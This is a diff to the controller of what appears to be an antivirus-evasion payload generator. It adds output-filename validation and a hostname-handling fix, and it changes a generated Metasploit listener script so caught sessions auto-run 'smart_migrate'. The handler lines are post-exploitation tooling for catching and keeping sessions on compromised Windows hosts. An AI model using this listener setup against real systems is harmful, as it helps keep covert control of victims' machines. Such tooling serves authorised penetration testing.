@@ -392,6 +392,17 @@ class Controller:
             print " [*] Press [enter] for 'payload'"
             OutputBaseChoice = raw_input(" [>] Please enter the base name for output files: ")
 
+            # ensure we get a base name and not a full path
+            while OutputBaseChoice != "" and "/" in OutputBaseChoice:
+                OutputBaseChoice = raw_input(helpers.color(" [!] Please enter a base name, not a full path: ", warning=True))
+
+        # for invalid output base choices that are passed by arguments
+        else:
+            if "/" in OutputBaseChoice:
+                print helpers.color(" [!] Please provide a base name, not a path, for the output base", warning=True)
+                print helpers.color(" [!] Defaulting to 'payload' for output base...", warning=True)
+            OutputBaseChoice = "payload"
+
         if OutputBaseChoice == "": OutputBaseChoice = "payload"
 
         # if we are overwriting, this is the base choice used
@@ -453,7 +464,7 @@ class Controller:
                     handler += "set LPORT " + parts[0] + "\n"
 
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/migrate\n"
+                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
                 handler += "exploit -j\n"
 
             # print out any msfvenom options we used in shellcode generation if specified
@@ -519,7 +530,7 @@ class Controller:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
 
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/migrate\n"
+                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
                 handler += "exploit -j\n"
 
         message += "\n Payload File:\t\t"+OutputFileName + "\n"
@@ -683,7 +694,7 @@ class Controller:
                                     # assume we've been passed a domain name
                                     else:
                                         if helpers.isValidHostname(value):
-                                            pass
+                                            payload.required_options[option][0] = value
                                         else:
                                             print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)
 
@@ -738,7 +749,7 @@ class Controller:
 
         showMessage = reset the screen and show the greeting message [default=True]
         oneRun = only run generation once, returning the path to the compiled executable
-        	used when invoking the framework from an external source
+            used when invoking the framework from an external source
         """
 
         self.outputFileName = ""
